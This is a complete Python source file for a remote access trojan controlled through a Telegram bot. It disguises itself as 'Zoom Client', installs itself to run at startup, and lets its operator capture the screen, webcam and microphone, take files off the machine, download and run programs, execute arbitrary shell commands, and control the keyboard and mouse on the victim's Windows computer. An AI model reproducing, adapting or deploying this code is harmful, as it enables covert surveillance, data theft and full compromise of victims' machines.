import telebot
import os
import webbrowser
import requests
import platform
import mouse
import PIL.ImageGrab
import cv2
from PIL import Image, ImageGrab
from pySmartDL import SmartDL
import time
import datetime
import hashlib
import ctypes, win32gui, win32ui
from winshell import startup
from shutil import copyfile
from sys import argv
from win32com.client import Dispatch
from pynput.keyboard import Key, Controller
import pyaudio
import wave
import wmi
import pythoncom
import psutil
import sounddevice as sd
import soundfile as sf
import winsound

# checkserver - check connection
# fastscreen - fastscreen
# fullscreen - fullscreen
# webcam - webcam
# msg - message to display
# startfile - start file
# findpaths - find paths for pc
# downloadfile - download from server
# uploadfile - upload to server
# deletefile - delete file from server
# downloadweb - download from web
# goweb - go to website
# startcmd - command to cmd
# poweroff - poweroff pc
# reboot - reboot pc
# hibernation - hibernation pc
# aboutpc - info of pc
# setcursorpx - px move for mouse
# up - up cur
# down - down cur
# left - left cur
# right - right cur
# entercr - enter mouse
# key - take a key combination
# write - write a text to str
# hear - hear from pc
# abortprogram - stop doing program
# workingprocesses - print working processes
# killprocess - kill process on pc
# playmusic - play music on pc
# stopmusic - stop playing music
# khz - start frequency generation
# volume - commands for control volume
# volup - Turn up the volume
# voldown - Turn down the volume
# volmax - Turn max the volume
# volmute - Mute

my_id = ''
my_id_time = 0
bot_token = ''
bot = telebot.TeleBot(bot_token)
date_start = datetime.datetime.now()
keyboard = Controller()
win_folder = os.path.expanduser('~')
hide_location = win_folder + r'\\' + 'Zoom Client.exe'
target_file = startup() + r'\\Zoom Client.lnk'

try:
    # if (argv[0]).endswith('.exe'):
    copyfile(argv[0], hide_location)
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(target_file)
    shortcut.Targetpath = hide_location
    shortcut.WorkingDirectory = win_folder
    shortcut.save()
except:
    pass

class User:
    def __init__(self):
        keys = ['urldown', 'fin', 'curs']

        for key in keys:
            self.key = None

User.curs = 50

MessageBox = ctypes.windll.user32.MessageBoxW

@bot.message_handler(content_types=["text"])
def get_text_messages(message):
    if hashlib.sha512(str(message.from_user.id).encode('utf-8')).hexdigest() == my_id:
        global my_id_time
        global date_timer
        if message.text == "/checkserver":
            date_timer = datetime.datetime.now().minute
            my_id_time = message.from_user.id
            req = requests.get('https://api.ipify.org')
            ip = req.text
            uname = os.getlogin()
            windows = platform.platform()
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, f'''Связь установлена, отклик: 
            {date_start}
            {datetime.datetime.now()}
            {datetime.datetime.now() - date_start}
            *Пользователь:* {uname}
            *IP:* {ip}
            *ОС:* {windows}''', parse_mode="markdown")
        try:
            date_now = datetime.datetime.now().minute
            if abs(date_now - date_timer) >= 5:
                my_id_time = 0
            else:
                pass
        except:
            pass

        if message.text == "/fastscreen":
            try:
                img = PIL.ImageGrab.grab()
                img.save("screen.png", "png")
                bot.send_chat_action(my_id_time, 'upload_photo')
                bot.send_photo(my_id_time, open("screen.png", "rb"))
                bot.register_next_step_handler(message, get_text_messages)
                os.remove("screen.png")
            except Exception as e:
                bot.send_chat_action(my_id_time, 'typing')
                bot.send_message(my_id_time, f"Ошибка - {e}")
                bot.register_next_step_handler(message, get_text_messages)

        elif message.text == "/fullscreen":
            bot.send_chat_action(my_id_time, 'upload_document')
            screen_process(message)

        elif message.text == "/volume":
            bot.send_chat_action(my_id_time, 'upload_document')
            bot.send_message(my_id_time, '''/volup - Turn up the volume
/voldown - Turn down the volume
/volmax - Turn max the volume
/volmute - Mute''')

        elif message.text.startswith("/volup"):
            try:
                bot.send_chat_action(my_id_time, 'typing')
                vl = round(int(message.text[6:])/2)
                for i in range(vl):
                    keyboard.press(Key.media_volume_up)
                    keyboard.release(Key.media_volume_up)
                bot.send_message(my_id_time, f"Громкость увеличена на {vl*2}")
            except Exception as e:
                bot.send_chat_action(my_id_time, 'typing')
                bot.send_message(my_id_time, f"Ошибка - {e}")
                bot.register_next_step_handler(message, get_text_messages)

        elif message.text.startswith("/voldown"):
            try:
                bot.send_chat_action(my_id_time, 'typing')
                vl = round(int(message.text[8:])/2)
                for i in range(vl):
                    keyboard.press(Key.media_volume_down)
                    keyboard.release(Key.media_volume_down)
                bot.send_message(my_id_time, f"Громкость уменьшена на {vl*2}")
            except Exception as e:
                bot.send_chat_action(my_id_time, 'typing')
                bot.send_message(my_id_time, f"Ошибка - {e}")
                bot.register_next_step_handler(message, get_text_messages)

        elif message.text == "/volmax":
            try:
                bot.send_chat_action(my_id_time, 'typing')
                for i in range(100):
                    keyboard.press(Key.media_volume_up)
                    keyboard.release(Key.media_volume_up)
                bot.send_message(my_id_time, "Звук увеличен на максимум")
            except Exception as e:
                bot.send_chat_action(my_id_time, 'typing')
                bot.send_message(my_id_time, f"Ошибка - {e}")
                bot.register_next_step_handler(message, get_text_messages)

        elif message.text == "/volmute":
            try:
                bot.send_chat_action(my_id_time, 'typing')
                keyboard.press(Key.media_volume_mute)
                keyboard.release(Key.media_volume_mute)
                bot.send_message(my_id_time, "Звук выключен")
            except Exception as e:
                bot.send_chat_action(my_id_time, 'typing')
                bot.send_message(my_id_time, f"Ошибка - {e}")
                bot.register_next_step_handler(message, get_text_messages)

        elif message.text == "/getlogs":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Файл загружается, подождите...")
            bot.send_chat_action(my_id_time, 'upload_document')
            bot.send_document(my_id_time, 'logs.txt')
            bot.register_next_step_handler(message, get_text_messages)

        elif message.text.startswith("/webcam"):
            camnumber = message.text.replace('/webcam', '')
            if camnumber == '':
                camnumber = 0
            bot.send_chat_action(my_id_time, 'upload_photo')
            try:
                cap = cv2.VideoCapture(camnumber)
                ret, frame = cap.read()
                cv2.imwrite('webcam.png', frame)
                cap.release()
                cv2.destroyAllWindows()
                bot.send_photo(my_id_time, open("webcam.png", "rb"))
                os.remove("webcam.png")
            except Exception as e:
                bot.send_chat_action(my_id_time, 'typing')
                bot.send_message(my_id_time, f"Ошибка - {e}")
                bot.register_next_step_handler(message, get_text_messages)

        elif message.text == "/msg":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Укажите текст уведомления:")
            bot.register_next_step_handler(message, messaga_process)

        elif message.text == "/goweb":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Укажите ссылку: ")
            bot.register_next_step_handler(message, web_process)

        elif message.text == "/playmusic":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Укажите путь или ссылку для воспроизводимого файла: ")
            bot.register_next_step_handler(message, play_music)

        elif message.text == "/khz":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Укажите частоту воспроизведения и время через знак @(ПР: 17000@6000, частота 17000гц, время 6000 миллисекунд):")
            bot.register_next_step_handler(message, khz)

        elif message.text == "/stopmusic":
            sd.stop()
            try:
                os.remove("temp_music.mp3")
            except:
                pass
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Воспроизведение остановлено")
            bot.register_next_step_handler(message, get_text_messages)

        elif message.text == "/startcmd":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Укажите консольную команду: ")
            bot.register_next_step_handler(message, cmd_process)

        elif message.text == "/poweroff":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Выключение компьютера...")
            try:
                os.popen('shutdown /s /f /t 0')
            except:
                pass
            bot.register_next_step_handler(message, get_text_messages)

        elif message.text == "/reboot":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Перезагрузка компьютера...")
            try:
                os.popen('shutdown /r /f /t 0')
            except:
                pass
            bot.register_next_step_handler(message, get_text_messages)

        elif message.text == "/hibernation":
            bot.send_message(my_id_time, "Гибернация...")
            try:
                os.popen('shutdown /h')
            except:
                pass
            bot.register_next_step_handler(message, get_text_messages)

        elif message.text == "/deletefile":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Укажите путь файла для удаления:")
            bot.register_next_step_handler(message, delete_file)

        elif message.text == "/aboutpc":
            try:
                bot.send_chat_action(my_id_time, 'typing')
                req = requests.get('https://api.ipify.org')
                ip = req.text
                uname = os.getlogin()
                windows = platform.platform()
                processor = platform.processor()
                bot.send_message(my_id_time, f"*Пользователь:* {uname}\n*IP:* {ip}\n*ОС:* {windows}\n*Процессор:* {processor}", parse_mode="markdown")
                bot.register_next_step_handler(message, get_text_messages)
            except Exception as e:
                bot.send_chat_action(my_id_time, 'typing')
                bot.send_message(my_id_time, f"Ошибка - {e}")
                bot.register_next_step_handler(message, get_text_messages)

        elif message.text == "/hear":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Укажите время прослушивания(не более 200):")
            bot.register_next_step_handler(message, hear_process)

        elif message.text == "/findpaths":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Укажите стартовый репозиторий: ")
            bot.register_next_step_handler(message, start_rat)

        elif message.text == "/startfile":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Укажите путь до файла: ")
            bot.register_next_step_handler(message, start_process)

        elif message.text == "/downloadfile":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Укажите путь до файла: ")
            bot.register_next_step_handler(message, downfile_process)

        elif message.text == "/uploadfile":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Отправьте необходимый файл")
            bot.register_next_step_handler(message, uploadfile_process)

        elif message.text == "/downloadweb":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Укажите прямую ссылку скачивания:")
            bot.register_next_step_handler(message, uploadurl_process)

        elif message.text == "/up":
            currentMouseX, currentMouseY = mouse.get_position()
            mouse.move(currentMouseX, currentMouseY - User.curs)

        elif message.text == "/down":
            currentMouseX, currentMouseY = mouse.get_position()
            mouse.move(currentMouseX, currentMouseY + User.curs)

        elif message.text == "/left":
            currentMouseX, currentMouseY = mouse.get_position()
            mouse.move(currentMouseX - User.curs, currentMouseY)

        elif message.text == "/right":
            currentMouseX, currentMouseY = mouse.get_position()
            mouse.move(currentMouseX + User.curs, currentMouseY)

        elif message.text == "/entercr":
            mouse.click()

        elif message.text == "/killprocess":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Введите название процесса для завершения: ")
            bot.register_next_step_handler(message, kill_process)

        elif message.text == "/workingprocesses":
            bot.send_chat_action(my_id_time, 'typing')
            try:
                pythoncom.CoInitialize()
                f = wmi.WMI()
                srez = 0
                processes = ""
                for process in f.Win32_Process():
                    processes += f"{process.Name} - {process.ProcessId}\n"
                words = processes.splitlines()
                words = [word for word in words if word]
                sorted_words_string = sorted(words)
                processes = "\n".join(sorted_words_string)
                processes = "Process name       PID\n\n" + processes
                if len(processes) > 4000:
                    for i in processes:
                        srez += 1
                        if i == '\n' and srez > 4000:
                            break
                    first_part = processes[srez:]
                    second_part = processes[:srez]
                    bot.send_message(my_id_time, second_part)
                    bot.send_message(my_id_time, first_part)
                else:
                    bot.send_message(my_id_time, processes)
            except Exception as e:
                bot.send_message(my_id_time, f'Ошибка - {e}')
                bot.register_next_step_handler(message, get_text_messages)
            finally:
                pythoncom.CoUninitialize()

        elif message.text == "/write":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Введите сообщение для написания: ")
            bot.register_next_step_handler(message, write_word)

        elif message.text == "/setcursorpx":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, f"Укажите размах, в данный момент размах {str(User.curs)}px")
            bot.register_next_step_handler(message, mousecurs_settings)

        elif message.text == "/key":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, f"Введите нажатие клавиш(ПР: AltF4, WinD, CtlV, если одна клавиша: nonEsc)")
            bot.register_next_step_handler(message, key_write)

        elif message.text == "/test":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "test successful")

        elif message.text == "/abortprogram":
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, "Вы уверены, что хотите завершить выполнение программы? Это действие необратимо, и ведет за собой последствия! После завершения программы ее нельзя будет больше запустить! Для подтверждения операции введите \"YesIWantToAbortProgramNow!\", для отказа введите \"Cancel\" или любое другое слово")
            bot.register_next_step_handler(message, abort_program)

        else:
            if message.text != "/checkserver":
                bot.send_chat_action(my_id_time, 'typing')
                bot.send_message(my_id_time, "Это хрень, а не команда!")
    else:
        info_user(message)

def abort_program(message):
    if message.text == "YesIWantToAbortProgramNow!" or message.text == "03052010":
        bot.send_chat_action(my_id_time, 'typing')
        bot.send_message(my_id_time, "Программа будет отключена немедленно!")
        os.abort()
    else:
        bot.send_chat_action(my_id_time, 'typing')
        bot.send_message(my_id_time, "Отмена завершения программы")
        bot.register_next_step_handler(message, get_text_messages)

def khz(message):
    bot.send_chat_action(my_id_time, 'typing')
    try:
        parts = message.text.split('@')
        if len(parts) > 1:
            if is_digit(parts[0]) and is_digit(parts[1]):
                if int(parts[0]) < 37 or int(parts[0]) > 32767:
                    bot.send_chat_action(my_id_time, 'typing')
                    bot.send_message(my_id_time, f"Значения частоты вне границы! Введите значение в границах от 37 до 32767")
                    bot.register_next_step_handler(message, get_text_messages)
                else:
                    bot.send_chat_action(my_id_time, 'typing')
                    bot.send_message(my_id_time, f"Воспроизведение началось")
                    winsound.Beep(int(parts[0]), int(parts[1]))
                    bot.send_chat_action(my_id_time, 'typing')
                    bot.send_message(my_id_time, f"Воспроизведение окончено")
                    bot.register_next_step_handler(message, get_text_messages)
            else:
                bot.send_chat_action(my_id_time, 'typing')
                bot.send_message(my_id_time, f"В строке присутствуют лишние символы. Требуется ввести целое число: ")
                bot.register_next_step_handler(message, khz)
        else:
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, f"Не найден знак разделения")
            bot.register_next_step_handler(message, get_text_messages)
    except Exception as e:
        bot.send_chat_action(my_id_time, 'typing')
        bot.send_message(my_id_time, f"Ошибка - {e}")
        bot.register_next_step_handler(message, get_text_messages)

def info_user(message):
    try:
        bot.send_chat_action(my_id_time, 'typing')
        alert = f"Кто-то пытался отправить команду: \"{message.text}\"\n\n"
        alert += f"time: {str(datetime.datetime.now())}\n"
        alert += f"user id: {str(message.from_user.id)}\n"
        alert += f"first name: {str(message.from_user.first_name)}\n"
        alert += f"last name: {str(message.from_user.last_name)}\n"
        alert += f"username: @{str(message.from_user.username)}\n\n\n"
        if my_id_time == 0:
            global alarm_message
            alarm_message += alert
        else:
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, alert)
            bot.register_next_step_handler(message, get_text_messages)
    except:
        pass

def play_music(message):
    try:
        if isinstance(message.text, str):
            if message.text[:4] == 'http':
                response = requests.get(message.text)
                with open("temp_music.mp3", "wb") as f:
                    f.write(response.content)
                array, smp_rt = sf.read('temp_music.mp3', dtype='float32')
                sd.play(array, smp_rt)
                bot.send_message(my_id_time, 'Воспроизведение запущено')
                status = sd.wait()
                sd.stop()
                try:
                    os.remove("temp_music.mp3")
                except:
                    pass
                bot.register_next_step_handler(message, get_text_messages)
            else:
                array, smp_rt = sf.read(message.text, dtype='float32')
                sd.play(array, smp_rt)
                bot.send_message(my_id_time, 'Воспроизведение запущено')
                status = sd.wait()
                sd.stop()
                bot.register_next_step_handler(message, get_text_messages)
        else:
            bot.send_message(my_id_time, f'Это не ссылка и не текст')
            bot.register_next_step_handler(message, get_text_messages)

    except Exception as e:
        bot.send_chat_action(my_id_time, 'typing')
        bot.send_message(my_id_time, f'Ошибка - {e}')
        bot.register_next_step_handler(message, get_text_messages)

def hear_process(message):
    try:
        Sec = int(message.text)
        audio = pyaudio.PyAudio()
        stream = audio.open(format=pyaudio.paInt16, channels=2,
                            rate=44100, input=True,
                            frames_per_buffer=1024)
        frames = []
        for i in range(0, int(44100 / 1024 * Sec)):
            data = stream.read(1024)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        audio.terminate()

        wav_path = win_folder + r'\\recording.wav'
        waveFile = wave.open(wav_path, 'wb')
        waveFile.setnchannels(2)
        waveFile.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
        waveFile.setframerate(44100)
        waveFile.writeframes(b''.join(frames))
        waveFile.close()
        bot.send_audio(my_id_time, audio=open(wav_path, 'rb'))
        os.remove(wav_path)
        bot.register_next_step_handler(message, get_text_messages)
    except Exception as e:
        bot.send_chat_action(my_id_time, 'typing')
        bot.send_message(my_id_time, f'Ошибка - {e}')
        bot.register_next_step_handler(message, get_text_messages)


def start_rat(message):
    srez = 0
    path = str(message.text)
    try:
        files = os.listdir(path)
        human_readable = ''
        if files:
            for file in files:
                human_readable += file + '\n'
            human_readable += '\n^Содержание ' + path
            if len(human_readable) > 4000:
                for i in human_readable:
                    srez+=1
                    if i == '\n' and srez > 4000:
                        break
                first_part = human_readable[srez:]
                second_part = human_readable[:srez]
                bot.send_message(my_id_time, second_part)
                bot.send_message(my_id_time, first_part)
            else:
                bot.send_message(my_id_time, human_readable)
        else:
            bot.send_message(my_id_time, f"Файлы отсуствуют в репозитории {path}")
            bot.register_next_step_handler(message, get_text_messages)
    except Exception as e:
        bot.send_chat_action(my_id_time, 'typing')
        bot.send_message(my_id_time, f'Ошибка - {e}')
        bot.register_next_step_handler(message, get_text_messages)


def start_process(message):
    bot.send_chat_action(my_id_time, 'typing')
    try:
        os.startfile(r'' + message.text)
        bot.send_message(my_id_time, f"Файл по пути \"{message.text}\" запустился")
        bot.register_next_step_handler(message, get_text_messages)
    except Exception as e:
        bot.send_message(my_id_time, f"Ошибка - {e}")
        bot.register_next_step_handler(message, get_text_messages)

def kill_process(message):
    bot.send_chat_action(my_id_time, 'typing')
    try:
        for proc in psutil.process_iter():
            if proc.name() == str(message.text):
                proc.terminate()
        bot.send_message(my_id_time, f"Процесс \"{message.text}\" завершен")
        bot.register_next_step_handler(message, get_text_messages)
    except Exception as e:
        bot.send_message(my_id_time, f"Ошибка - {e}")
        bot.register_next_step_handler(message, get_text_messages)


def write_word(message):
    if message.text == "emergencystopprocess":
        bot.send_chat_action(my_id_time, 'typing')
        bot.send_message(my_id_time, "Применена экстренная остановка! Текст не написан")
        bot.register_next_step_handler(message, get_text_messages)
    else:
        bot.send_chat_action(my_id_time, 'typing')
        keyboard.type(message.text)
        bot.send_message(my_id_time, f"Текст \"{message.text}\" был успешно выведенен")

def key_write(message):
    bot.send_chat_action(my_id_time, 'typing')
    try:
        key_stroke = message.text.lower()
        if key_stroke[:3] == "alt":
            keyboard.press(Key.alt)
            keyboard.press(key_stroke[3:])
            keyboard.release(key_stroke[3:])
            keyboard.release(Key.alt)
            bot.send_message(my_id_time, f"Комбинация клавиш \"{key_stroke}\" успешно нажата")
            bot.register_next_step_handler(message, get_text_messages)
        if key_stroke[:3] == "win":
            keyboard.press(Key.cmd)
            keyboard.press(str(key_stroke[3:]))
            keyboard.release(str(key_stroke[3:]))
            keyboard.release(Key.cmd)
            bot.send_message(my_id_time, f"Комбинация клавиш \"{key_stroke}\" успешно нажата")
            bot.register_next_step_handler(message, get_text_messages)
        if key_stroke[:3] == "ctl":
            keyboard.press(Key.ctrl)
            keyboard.press(str(key_stroke[3:]))
            keyboard.release(str(key_stroke[3:]))
            keyboard.release(Key.ctrl)
            bot.send_message(my_id_time, f"Комбинация клавиш \"{key_stroke}\" успешно нажата")
            bot.register_next_step_handler(message, get_text_messages)
        if key_stroke[:3] == "sht":
            keyboard.press(Key.shift)
            keyboard.press(str(key_stroke[3:]))
            keyboard.release(str(key_stroke[3:]))
            keyboard.release(Key.shift)
            bot.send_message(my_id_time, f"Комбинация клавиш \"{key_stroke}\" успешно нажата")
            bot.register_next_step_handler(message, get_text_messages)
        if key_stroke[:3] == "non":
            keyboard.press(getattr(Key, str(key_stroke[3:])))
            keyboard.release(getattr(Key, str(key_stroke[3:])))
            bot.send_message(my_id_time, f"Клавиша \"{key_stroke}\" успешно нажата")
            bot.register_next_step_handler(message, get_text_messages)
    except Exception as e:
        bot.send_message(my_id_time, f"Ошибка - {e}")
        bot.register_next_step_handler(message, get_text_messages)

def web_process(message):
    bot.send_chat_action(my_id_time, 'typing')
    if message.text == "emergencystopprocess":
        bot.send_chat_action(my_id_time, 'typing')
        bot.send_message(my_id_time, "Применена экстренная остановка! Ссылка не была открыта")
        bot.register_next_step_handler(message, get_text_messages)
    else:
        try:
            webbrowser.open(message.text, new=0)
            bot.send_message(my_id_time, f"Переход по ссылке \"{message.text}\" осуществлён")
            bot.register_next_step_handler(message, get_text_messages)
        except:
            bot.send_message(my_id_time, "Ошибка! ссылка введена неверно")
            bot.register_next_step_handler(message, get_text_messages)

def delete_file(message):
    bot.send_chat_action(my_id_time, 'typing')
    try:
        os.remove(message.text)
        bot.send_message(my_id_time, f"Удален файл {message.text}")
        bot.register_next_step_handler(message, get_text_messages)
    except Exception as e:
        bot.send_message(my_id_time, f"Ошибка удаления файла - {e}")
        bot.register_next_step_handler(message, get_text_messages)

def cmd_process(message):
    bot.send_chat_action(my_id_time, 'typing')
    if message.text == "emergencystopprocess":
        bot.send_chat_action(my_id_time, 'typing')
        bot.send_message(my_id_time, "Применена экстренная остановка! Команда не выполнена")
        bot.register_next_step_handler(message, get_text_messages)
    else:
        try:
            os.system(message.text)
            bot.send_message(my_id_time, f"Команда \"{message.text}\" выполнена")
            bot.register_next_step_handler(message, get_text_messages)
        except Exception as e:
            bot.send_message(my_id_time, f"Ошибка - {e}")
            bot.register_next_step_handler(message, get_text_messages)



def downfile_process(message):
    bot.send_chat_action(my_id_time, 'typing')
    try:
        file_path = message.text
        if os.path.exists(file_path):
            bot.send_message(my_id_time, "Файл загружается, подождите...")
            bot.send_chat_action(my_id_time, 'upload_document')
            file_doc = open(file_path, 'rb')
            bot.send_document(my_id_time, file_doc)
            bot.register_next_step_handler(message, get_text_messages)
        else:
            bot.send_message(my_id_time, "Файл не найден или указан неверный путь (ПР.: C:\\Documents\\File.doc)")
            bot.register_next_step_handler(message, get_text_messages)
    except:
        bot.send_message(my_id_time, "Ошибка! Файл не найден или указан неверный путь (ПР.: C:\\Documents\\File.doc)")
        bot.register_next_step_handler(message, get_text_messages)


def uploadfile_process(message):
    bot.send_chat_action(my_id_time, 'typing')
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        src = message.document.file_name
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.send_message(my_id_time, "Файл успешно загружен")
        bot.register_next_step_handler(message, get_text_messages)
    except:
        bot.send_message(my_id_time, "Ошибка! Отправьте файл как документ")
        bot.register_next_step_handler(message, get_text_messages)


def uploadurl_process(message):
    bot.send_chat_action(my_id_time, 'typing')
    User.urldown = message.text
    bot.send_message(my_id_time, "Укажите путь сохранения файла:")
    bot.register_next_step_handler(message, uploadurl_2process)


def uploadurl_2process(message):
    bot.send_chat_action(my_id_time, 'typing')
    bot.send_message(my_id_time, "Загрузка началась...")
    try:
        User.fin = message.text
        obj = SmartDL(User.urldown, User.fin, progress_bar=False)
        obj.start()
        bot.send_message(my_id_time, f"Файл успешно сохранён по пути \"{User.fin}\"")
        bot.register_next_step_handler(message, get_text_messages)
    except Exception as e:
        bot.send_message(my_id_time, f"Указаны неверная ссылка или путь - {e}")
        bot.register_next_step_handler(message, get_text_messages)


def messaga_process(message):
    bot.send_chat_action(my_id_time, 'typing')
    if message.text == "emergencystopprocess":
        bot.send_chat_action(my_id_time, 'typing')
        bot.send_message(my_id_time, "Применена экстренная остановка! Сообщение не выведено")
        bot.register_next_step_handler(message, get_text_messages)
    else:
        try:
            MessageBox(None, message.text, 'Zoom', 0)
            bot.send_message(my_id_time, f"Уведомление с текстом \"{message.text}\" было закрыто")
        except Exception as e:
            bot.send_chat_action(my_id_time, 'typing')
            bot.send_message(my_id_time, f"Ошибка - {e}")
            bot.register_next_step_handler(message, get_text_messages)


def mousecurs_settings(message):
    bot.send_chat_action(my_id_time, 'typing')
    if is_digit(message.text) == True:
        User.curs = int(message.text)
        bot.send_message(my_id_time, f"Размах курсора изменен на {str(User.curs)}px")
        bot.register_next_step_handler(message, get_text_messages)
    else:
        bot.send_message(my_id_time, "Введите целое число: ")
        bot.register_next_step_handler(message, mousecurs_settings)


def screen_process(message):
    try:
        hcursor = win32gui.GetCursorInfo()[1]
        hdc = win32ui.CreateDCFromHandle(win32gui.GetDC(0))
        hbmp = win32ui.CreateBitmap()
        hbmp.CreateCompatibleBitmap(hdc, 36,36)
        hdc = hdc.CreateCompatibleDC()
        hdc.SelectObject(hbmp)
        hdc.DrawIcon((0, 0), hcursor)
        bmpinfo = hbmp.GetInfo()
        bmpstr = hbmp.GetBitmapBits(True)
        cursor = Image.frombuffer('RGB', (bmpinfo['bmWidth'], bmpinfo['bmHeight']), bmpstr, 'raw', 'BGRX', 0,
                                  1).convert("RGBA")
        win32gui.DestroyIcon(hcursor)
        win32gui.DeleteObject(hbmp.GetHandle())
        hdc.DeleteDC()
        pixdata = cursor.load()
        width, height = cursor.size
        for y in range(height):
            for x in range(width):
                if pixdata[x, y] == (0, 0, 0, 255):
                    pixdata[x, y] = (0, 0, 0, 0)
        for y in range(height):
            for x in range(width):
                if pixdata[x, y] == (255, 255, 255, 255):
                    pixdata[x, y] = (0, 255, 0, 255)
        hotspot = win32gui.GetIconInfo(hcursor)[1:3]
        cursor, (hotspotx, hotspoty) = cursor, hotspot
        cursor.save("cursor.png")
        ratio = ctypes.windll.shcore.GetScaleFactorForDevice(0) / 100
        img = ImageGrab.grab(bbox=None, include_layered_windows=True)
        pos_win = win32gui.GetCursorPos()
        pos = (round(pos_win[0] * ratio - hotspotx), round(pos_win[1] * ratio - hotspoty))
        img.paste(cursor, pos, cursor)
        img.save("screenshot.png")
        bot.send_document(my_id_time, open("screenshot.png", "rb"))
        bot.register_next_step_handler(message, get_text_messages)
        os.remove("cursor.png")
        os.remove("screenshot.png")
    except Exception as e:
        bot.send_chat_action(my_id_time, 'typing')
        bot.send_message(my_id_time, f"Ошибка - {e}")
        bot.register_next_step_handler(message, get_text_messages)

def is_digit(string):
    if string.isdigit():
        return True
    else:
        try:
            float(string)
            return True
        except ValueError:
            return False

while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except:
        time.sleep(2)
